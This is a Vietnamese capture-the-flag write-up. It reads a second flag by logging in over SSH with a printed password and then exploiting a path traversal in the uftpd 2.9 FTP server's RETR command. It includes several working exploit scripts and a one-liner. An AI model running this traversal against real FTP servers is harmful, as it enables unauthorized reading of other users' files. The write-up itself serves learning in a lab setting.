# CIT Pwn - Challenge 2 Writeup (Flag2) - Detailed

## Mục tiêu

Lấy `flag2` từ target `23.179.17.69`.

---

## 0) Điểm xuất phát

Từ challenge 1 đã có credential hợp lệ:

- `user`: `greg`
- `password`: `DXIjeNZC8Tf2SrjtRaWg1h4SZl5DZk6G`

Và đã biết service chính:

- SSH: `22/tcp`
- FTP custom (`uftpd`): `10921/tcp`

Tạo thư mục làm việc:

```bash
mkdir -p chall2 && cd chall2
```

---

## 1) Xác thực quyền hiện tại qua SSH

### Script: `01_ssh_check.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-23.179.17.69}"
USER="${2:-greg}"

ssh -o StrictHostKeyChecking=no "$USER@$TARGET" <<'EOF'
whoami
id
pwd
ls -la ~
EOF
```

Chạy:

```bash
chmod +x 01_ssh_check.sh
./01_ssh_check.sh
```

Kết luận:

- Đăng nhập SSH thành công với user `greg`.
- User `greg` không phải root.

---

## 2) Enumerate để tìm hướng lấy flag2

Hint đề bài: **không có root flag truyền thống** -> nhiều khả năng nằm ở user khác hoặc nơi không phải `/root`.

### Script: `02_enum_users_and_perms.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-23.179.17.69}"
USER="${2:-greg}"

ssh -o StrictHostKeyChecking=no "$USER@$TARGET" <<'EOF'
echo "[*] users"
getent passwd | egrep 'greg|jimbo'

echo
echo "[*] check home of jimbo"
ls -ld /home/jimbo
ls -la /home/jimbo 2>&1 | head

echo
echo "[*] direct read attempt"
cat /home/jimbo/flag2.txt 2>&1 | head
EOF
```

Chạy:

```bash
chmod +x 02_enum_users_and_perms.sh
./02_enum_users_and_perms.sh
```

Kết quả:

- Tồn tại user `jimbo`.
- `greg` không có quyền đọc trực tiếp `/home/jimbo/flag2.txt`.

---

## 3) Xác nhận FTP traversal hoạt động

Service `uftpd (2.9)` có path traversal với lệnh `RETR`.

### Script: `03_test_ftp_traversal.py`

```python
#!/usr/bin/env python3
from ftplib import FTP
from io import BytesIO

HOST = "127.0.0.1"
PORT = 10921

targets = [
    "../../../../home/jimbo/flag2.txt",
    "../../../../home/jimbo/flag.txt",
]

for t in targets:
    print(f"[+] RETR {t}")
    try:
        ftp = FTP()
        ftp.connect(HOST, PORT, timeout=10)
        ftp.login("anonymous", "anonymous")

        buf = BytesIO()
        ftp.retrbinary(f"RETR {t}", buf.write)
        ftp.quit()

        data = buf.getvalue().decode(errors="ignore").strip()
        print(f"    len={len(data)}")
        print(f"    data={data}")
    except Exception as e:
        print(f"    error={e!r}")
```

Chạy script này trên target (qua SSH):

```bash
ssh greg@23.179.17.69 "python3 -" < 03_test_ftp_traversal.py
```

Kết quả mong đợi:

```text
[+] RETR ../../../../home/jimbo/flag2.txt
    data=CIT{Br41n_bLa$t3R}
```

---

## 4) PoC ngắn gọn lấy flag2

Nếu chỉ cần lấy flag ngay:

```bash
ssh greg@23.179.17.69 "python3 - <<'PY'
from ftplib import FTP
from io import BytesIO

ftp = FTP()
ftp.connect('127.0.0.1', 10921, timeout=10)
ftp.login('anonymous', 'anonymous')
buf = BytesIO()
ftp.retrbinary('RETR ../../../../home/jimbo/flag2.txt', buf.write)
ftp.quit()
print(buf.getvalue().decode().strip())
PY"
```

Output:

```text
CIT{Br41n_bLa$t3R}
```

---

## 5) One-shot solve script

### Script: `solve_chall2.py`

```python
#!/usr/bin/env python3
import argparse
import re
import sys
from ftplib import FTP
from io import BytesIO


def get_flag(host: str, port: int, path: str) -> str:
    ftp = FTP()
    ftp.connect(host, port, timeout=10)
    ftp.login("anonymous", "anonymous")
    buf = BytesIO()
    ftp.retrbinary(f"RETR {path}", buf.write)
    ftp.quit()
    out = buf.getvalue().decode(errors="ignore")
    m = re.search(r"(CIT\{[^}\n]+\})", out)
    if not m:
        raise RuntimeError(f"Flag not found. Raw output: {out!r}")
    return m.group(1)


def main() -> None:
    parser = argparse.ArgumentParser(description="Challenge 2 local FTP traversal solver")
    parser.add_argument("--host", default="127.0.0.1", help="FTP host (run on target => 127.0.0.1)")
    parser.add_argument("--port", type=int, default=10921)
    parser.add_argument("--path", default="../../../../home/jimbo/flag2.txt")
    args = parser.parse_args()

    try:
        flag = get_flag(args.host, args.port, args.path)
        print(f"[+] flag2={flag}")
    except Exception as e:
        print(f"[-] {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
```

Cách chạy:

```bash
# copy script lên target hoặc paste trực tiếp
python3 solve_chall2.py
```

---

## Troubleshooting nhanh

1. Nếu chạy từ máy local ngoài target mà fail traversal:
   - Hãy chạy script **trong SSH session của greg** và để host FTP là `127.0.0.1`.
2. Nếu báo timeout:
   - Kiểm tra service FTP còn lắng nghe `10921` không (`ss -lntp | grep 10921`).
3. Nếu output không match regex `CIT{...}`:
   - In raw output để kiểm tra newline/format.

---

## Flag2

```text
CIT{Br41n_bLa$t3R}
```
